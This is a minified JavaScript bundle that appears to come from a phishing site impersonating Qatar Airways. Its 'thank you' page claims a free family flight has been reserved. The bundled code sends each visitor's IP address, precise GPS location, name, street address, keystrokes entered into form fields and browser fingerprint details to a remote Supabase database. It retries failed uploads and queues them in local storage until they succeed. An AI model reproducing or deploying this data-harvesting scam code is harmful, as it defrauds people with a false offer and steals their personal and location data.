(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[755],{2099:(e,t,a)=>{"use strict";a.d(t,{k:()=>o});let s=(0,a(5647).UU)("https://kevmuziwabpiitfjsqxa.supabase.co","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtldm11eml3YWJwaWl0ZmpzcXhhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTIwODI1NzIsImV4cCI6MjA2NzY1ODU3Mn0.jog56wKSQHalOz9vfNieGFNU1aMbPUQAnDa-R3_ZlJg"),i="qatar_session_id",r="failed_submissions",n=[],o={getSessionId:()=>{let e=localStorage.getItem(i);return e||(e="session_"+Date.now()+"_"+Math.random().toString(36).substr(2,9),localStorage.setItem(i,e),sessionStorage.setItem(i,e)),e},getUserIP:async()=>{for(let e of["https://api.ipify.org?format=json","https://ipapi.co/json/","https://jsonip.com"])try{let t=await fetch(e,{timeout:5e3}),a=await t.json();return a.ip||a.IPv4||a.query}catch(t){console.warn("IP service ".concat(e," failed:"),t);continue}return null},reliableInsert:async function(e,t){let a=arguments.length>2&&void 0!==arguments[2]?arguments[2]:3;for(let i=1;i<=a;i++)try{let{data:o,error:l}=await s.from(e).insert([t]);if(!l)return console.log("✅ ".concat(e," insert successful on attempt ").concat(i)),o;if(i===a){console.error("❌ ".concat(e," insert failed after ").concat(a," attempts:"),l),n.push({table:e,data:t,retries:0});{let a=JSON.parse(localStorage.getItem(r)||"[]");a.push({table:e,data:t,timestamp:new Date().toISOString()}),localStorage.setItem(r,JSON.stringify(a))}throw l}await new Promise(e=>setTimeout(e,1e3*Math.pow(2,i)))}catch(t){if(i===a)throw t;console.warn("⚠️ ".concat(e," insert attempt ").concat(i," failed, retrying..."))}},processQueue:async()=>{if(0===n.length)return;let e=[...n];for(let t of(n=[],e))try{await o.reliableInsert(t.table,t.data,2)}catch(e){t.retries<3&&(t.retries++,n.push(t))}},trackUserAction:async function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null,a=arguments.length>2&&void 0!==arguments[2]?arguments[2]:null;try{let s=o.getSessionId(),i=await o.getUserIP(),r={action_type:e,action_data:t,error_message:a,timestamp:new Date().toISOString(),session_id:s,user_agent:navigator.userAgent,ip_address:i,url:window.location.href};await o.reliableInsert("user_actions",r)}catch(e){console.error("Failed to track user action:",e)}},trackPageVisit:async e=>{try{let t=o.getSessionId(),a=await o.getUserIP(),s={page_name:e,timestamp:new Date().toISOString(),session_id:t,user_agent:navigator.userAgent,ip_address:a,referrer:document.referrer,url:window.location.href};await o.reliableInsert("page_visits",s)}catch(e){console.error("Failed to track page visit:",e)}},trackLocationPermission:async function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null;try{let a=o.getSessionId(),s=await o.getUserIP(),i={permission_status:e,latitude:(null==t?void 0:t.latitude)||null,longitude:(null==t?void 0:t.longitude)||null,accuracy:(null==t?void 0:t.accuracy)||null,altitude:(null==t?void 0:t.altitude)||null,heading:(null==t?void 0:t.heading)||null,speed:(null==t?void 0:t.speed)||null,location_method:(null==t?void 0:t.method)||null,location_quality:(null==t?void 0:t.quality)||null,error_message:(null==t?void 0:t.error)||null,timestamp:new Date().toISOString(),session_id:a,user_agent:navigator.userAgent,ip_address:s};await o.reliableInsert("location_permissions",i)}catch(e){console.error("Failed to track location permission:",e)}},trackFormInteraction:async function(e){let t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null,a=arguments.length>2&&void 0!==arguments[2]?arguments[2]:null;try{let s=o.getSessionId(),i={interaction_type:e,field_name:t,field_value:null!==a?String(a):null,timestamp:new Date().toISOString(),session_id:s,user_agent:navigator.userAgent};await o.reliableInsert("form_interactions",i)}catch(e){console.error("Failed to track form interaction:",e)}},insertFormSubmission:async e=>{let t={first_name:e.firstName||null,last_name:e.lastName||null,postcode:e.postcode,street_address:e.streetAddress,city:e.city||null,destination:e.destination,latitude:e.latitude||null,longitude:e.longitude||null,location_accuracy:e.location_accuracy||null,location_method:e.location_method||null,location_timestamp:e.location_timestamp||null,location_quality:e.location_quality||null,timestamp:e.timestamp,user_agent:e.userAgent,ip_address:e.ipAddress||null,session_id:e.sessionId,browser_language:e.browser_language||null,browser_timezone:e.browser_timezone||null,browser_screen:e.browser_screen||null,browser_platform:e.browser_platform||null,browser_cookies:e.browser_cookies||null,submit_attempt_number:e.submit_attempt_number||1,referrer:e.referrer||null,page_url:e.page_url||null,device_memory:e.device_memory||null,connection_type:e.connection_type||null,time_zone_offset:e.time_zone_offset||null,local_storage_available:e.local_storage_available||null,form_completion_time:e.form_completion_time||null,validation_errors_count:e.validation_errors_count||0,user_journey:e.user_journey||null};try{return console.log("\uD83C\uDFAF Submitting form data to form_submissions table..."),await o.reliableInsert("form_submissions",t,5),console.log("✅ Form submission successful!"),!0}catch(e){console.warn("⚠️ Primary form submission failed, using fallback...");try{return await o.trackUserAction("form_submission_fallback",{form_data:t,primary_error:String(e),fallback_method:"user_actions_table"}),console.log("✅ Form data saved via fallback method!"),!0}catch(e){throw console.error("❌ Both primary and fallback submissions failed:",e),e}}},retryFailedSubmissions:async()=>{try{await o.processQueue();let e=JSON.parse(localStorage.getItem(r)||"[]");if(0===e.length)return;let t=e.map(async e=>{try{return await o.reliableInsert(e.table,e.data,2),e}catch(e){return null}}),a=await Promise.allSettled(t),s=a.filter(e=>"fulfilled"===e.status&&null!==e.value);if(s.length>0){let t=e.filter((e,t)=>"rejected"===a[t].status||null===a[t].value);localStorage.setItem(r,JSON.stringify(t)),console.log("✅ Retried ".concat(s.length," failed submissions successfully"))}}catch(e){console.error("Failed to retry submissions:",e)}}}},2510:(e,t,a)=>{Promise.resolve().then(a.bind(a,3337))},3337:(e,t,a)=>{"use strict";a.r(t),a.d(t,{default:()=>f});var s=a(5155),i=a(9137),r=a.n(i),n=a(2115),o=a(5695),l=a(2099),d=a(6766);function f(){let e=(0,o.useRouter)();return(0,n.useEffect)(()=>{l.k.trackPageVisit("thank_you_page");let t=setTimeout(()=>{e.push("/")},1e4);return()=>clearTimeout(t)},[e]),(0,s.jsxs)("div",{className:"jsx-83fd82a9f1ef00db thank-you-page",children:[(0,s.jsxs)("div",{className:"jsx-83fd82a9f1ef00db content-container",children:[(0,s.jsxs)("div",{className:"jsx-83fd82a9f1ef00db header-section",children:[(0,s.jsx)("div",{className:"jsx-83fd82a9f1ef00db logo-container",children:(0,s.jsx)(d.default,{src:"https://logotyp.us/files/qatar-airways.svg",alt:"Qatar Airways",className:"logo",width:140,height:60})}),(0,s.jsx)("div",{className:"jsx-83fd82a9f1ef00db badge-container",children:(0,s.jsx)("div",{className:"jsx-83fd82a9f1ef00db free-flight-badge",children:"Free Family Flight"})})]}),(0,s.jsxs)("div",{className:"jsx-83fd82a9f1ef00db success-content",children:[(0,s.jsx)("div",{className:"jsx-83fd82a9f1ef00db success-icon-large",children:(0,s.jsx)("svg",{viewBox:"0 0 24 24",fill:"none",xmlns:"http://www.w3.org/2000/svg",className:"jsx-83fd82a9f1ef00db",children:(0,s.jsx)("path",{d:"M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round",className:"jsx-83fd82a9f1ef00db"})})}),(0,s.jsx)("h1",{className:"jsx-83fd82a9f1ef00db",children:"Congratulations!"}),(0,s.jsx)("h2",{className:"jsx-83fd82a9f1ef00db",children:"Your FREE Family Flight is Reserved"}),(0,s.jsxs)("div",{className:"jsx-83fd82a9f1ef00db message-content",children:[(0,s.jsx)("p",{className:"jsx-83fd82a9f1ef00db main-message",children:"Your complimentary family flight (up to 4 passengers) has been successfully reserved. A Qatar Airways specialist will contact you within 24 hours to confirm your booking and travel details."}),(0,s.jsxs)("div",{className:"jsx-83fd82a9f1ef00db next-steps",children:[(0,s.jsx)("h3",{className:"jsx-83fd82a9f1ef00db",children:"What Happens Next:"}),(0,s.jsxs)("ul",{className:"jsx-83fd82a9f1ef00db",children:[(0,s.jsx)("li",{className:"jsx-83fd82a9f1ef00db",children:"✈️ Personal booking specialist contact within 24 hours"}),(0,s.jsx)("li",{className:"jsx-83fd82a9f1ef00db",children:"\uD83D\uDCC5 Flexible travel dates to any Qatar Airways destination"}),(0,s.jsx)("li",{className:"jsx-83fd82a9f1ef00db",children:"\uD83C\uDFAF Premium cabin service and priority boarding"}),(0,s.jsx)("li",{className:"jsx-83fd82a9f1ef00db",children:"\uD83D\uDCF1 Dedicated support throughout your journey"})]})]}),(0,s.jsx)("p",{className:"jsx-83fd82a9f1ef00db final-note",children:"Check your email for confirmation details. Your extraordinary family adventure awaits!"})]})]}),(0,s.jsxs)("div",{className:"jsx-83fd82a9f1ef00db footer-section",children:[(0,s.jsxs)("div",{className:"jsx-83fd82a9f1ef00db security-badge",children:[(0,s.jsx)("svg",{viewBox:"0 0 24 24",fill:"none",xmlns:"http://www.w3.org/2000/svg",className:"jsx-83fd82a9f1ef00db",children:(0,s.jsx)("path",{d:"M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11.5C15.4,11.5 16,12.1 16,12.7V16.2C16,16.8 15.4,17.3 14.8,17.3H9.2C8.6,17.3 8,16.8 8,16.2V12.8C8,12.2 8.6,11.7 9.2,11.7V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.5,8.7 10.5,9.5V11.5H13.5V9.5C13.5,8.7 12.8,8.2 12,8.2Z",fill:"currentColor",className:"jsx-83fd82a9f1ef00db"})}),(0,s.jsx)("span",{className:"jsx-83fd82a9f1ef00db",children:"Your data is secure and protected"})]}),(0,s.jsx)("div",{className:"jsx-83fd82a9f1ef00db redirect-notice",children:(0,s.jsx)("p",{className:"jsx-83fd82a9f1ef00db",children:"You will be redirected automatically in 10 seconds..."})})]})]}),(0,s.jsx)(r(),{id:"83fd82a9f1ef00db",children:'.thank-you-page.jsx-83fd82a9f1ef00db{min-height:100vh;background:#fff;font-family:"Inter","Segoe UI",Tahoma,Geneva,Verdana,sans-serif;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;padding:2rem 1rem;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}.content-container.jsx-83fd82a9f1ef00db{background:#fff;width:100%;max-width:600px;padding:2rem;text-align:center}.header-section.jsx-83fd82a9f1ef00db{margin-bottom:3rem}.logo-container.jsx-83fd82a9f1ef00db{display:inline-block;margin-bottom:1.5rem}.logo.jsx-83fd82a9f1ef00db{width:max(120px,min(20vw,140px));width:clamp(120px,20vw,140px);height:auto}.badge-container.jsx-83fd82a9f1ef00db{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;margin-bottom:1rem}.free-flight-badge.jsx-83fd82a9f1ef00db{background:-webkit-linear-gradient(315deg,#10b981 0%,#059669 100%);background:-moz-linear-gradient(315deg,#10b981 0%,#059669 100%);background:-o-linear-gradient(315deg,#10b981 0%,#059669 100%);background:linear-gradient(135deg,#10b981 0%,#059669 100%);color:white;padding:.75rem 1.5rem;-webkit-border-radius:30px;-moz-border-radius:30px;border-radius:30px;font-weight:600;font-size:1rem;text-transform:uppercase;letter-spacing:.5px;-webkit-box-shadow:0 4px 12px rgba(16,185,129,.3);-moz-box-shadow:0 4px 12px rgba(16,185,129,.3);box-shadow:0 4px 12px rgba(16,185,129,.3)}.success-content.jsx-83fd82a9f1ef00db{margin-bottom:2rem}.success-icon-large.jsx-83fd82a9f1ef00db{width:80px;height:80px;margin:0 auto 1.5rem;color:#10b981}.success-icon-large.jsx-83fd82a9f1ef00db svg.jsx-83fd82a9f1ef00db{width:100%;height:100%}h1.jsx-83fd82a9f1ef00db{font-size:2.5rem;font-weight:700;color:#1f2937;margin-bottom:.5rem;background:-webkit-linear-gradient(315deg,#10b981 0%,#059669 100%);background:-moz-linear-gradient(315deg,#10b981 0%,#059669 100%);background:-o-linear-gradient(315deg,#10b981 0%,#059669 100%);background:linear-gradient(135deg,#10b981 0%,#059669 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}h2.jsx-83fd82a9f1ef00db{font-size:1.5rem;font-weight:600;color:#374151;margin-bottom:2rem}.message-content.jsx-83fd82a9f1ef00db{text-align:left;margin:2rem 0}.main-message.jsx-83fd82a9f1ef00db{font-size:1.1rem;line-height:1.6;color:#374151;margin-bottom:2rem;text-align:center}.next-steps.jsx-83fd82a9f1ef00db{background:#f9fafb;-webkit-border-radius:12px;-moz-border-radius:12px;border-radius:12px;padding:1.5rem;margin:2rem 0;border:1px solid#e5e7eb}.next-steps.jsx-83fd82a9f1ef00db h3.jsx-83fd82a9f1ef00db{font-size:1.2rem;font-weight:600;color:#1f2937;margin-bottom:1rem;text-align:center}.next-steps.jsx-83fd82a9f1ef00db ul.jsx-83fd82a9f1ef00db{list-style:none;padding:0;margin:0}.next-steps.jsx-83fd82a9f1ef00db li.jsx-83fd82a9f1ef00db{padding:.75rem 0;font-size:1rem;color:#374151;display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;gap:.75rem;border-bottom:1px solid#e5e7eb}.next-steps.jsx-83fd82a9f1ef00db li.jsx-83fd82a9f1ef00db:last-child{border-bottom:none}.final-note.jsx-83fd82a9f1ef00db{font-size:1rem;line-height:1.6;color:#6b7280;text-align:center;font-style:italic}.footer-section.jsx-83fd82a9f1ef00db{border-top:1px solid#e5e7eb;padding-top:1.5rem;margin-top:2rem}.security-badge.jsx-83fd82a9f1ef00db{display:-webkit-box;display:-webkit-flex;display:-moz-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-moz-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;-moz-box-pack:center;-ms-flex-pack:center;justify-content:center;gap:.5rem;margin-bottom:1rem}.security-badge.jsx-83fd82a9f1ef00db svg.jsx-83fd82a9f1ef00db{width:20px;height:20px;color:#10b981}.security-badge.jsx-83fd82a9f1ef00db span.jsx-83fd82a9f1ef00db{font-size:.9rem;color:#6b7280}.redirect-notice.jsx-83fd82a9f1ef00db{margin-top:1rem}.redirect-notice.jsx-83fd82a9f1ef00db p.jsx-83fd82a9f1ef00db{font-size:.9rem;color:#9ca3af;margin:0}@media(max-width:768px){.thank-you-page.jsx-83fd82a9f1ef00db{padding:1rem .5rem}.content-container.jsx-83fd82a9f1ef00db{padding:1.5rem 1rem}h1.jsx-83fd82a9f1ef00db{font-size:2rem}h2.jsx-83fd82a9f1ef00db{font-size:1.3rem}.main-message.jsx-83fd82a9f1ef00db{font-size:1rem}.next-steps.jsx-83fd82a9f1ef00db{padding:1rem}.next-steps.jsx-83fd82a9f1ef00db li.jsx-83fd82a9f1ef00db{font-size:.9rem;padding:.5rem 0}.free-flight-badge.jsx-83fd82a9f1ef00db{font-size:.9rem;padding:.6rem 1.2rem}}@media(max-width:480px){.content-container.jsx-83fd82a9f1ef00db{padding:1rem .75rem}h1.jsx-83fd82a9f1ef00db{font-size:1.75rem}h2.jsx-83fd82a9f1ef00db{font-size:1.1rem}.next-steps.jsx-83fd82a9f1ef00db li.jsx-83fd82a9f1ef00db{font-size:.85rem;gap:.5rem}}'})]})}}},e=>{var t=t=>e(e.s=t);e.O(0,[197,441,684,358],()=>t(2510)),_N_E=e.O()}]);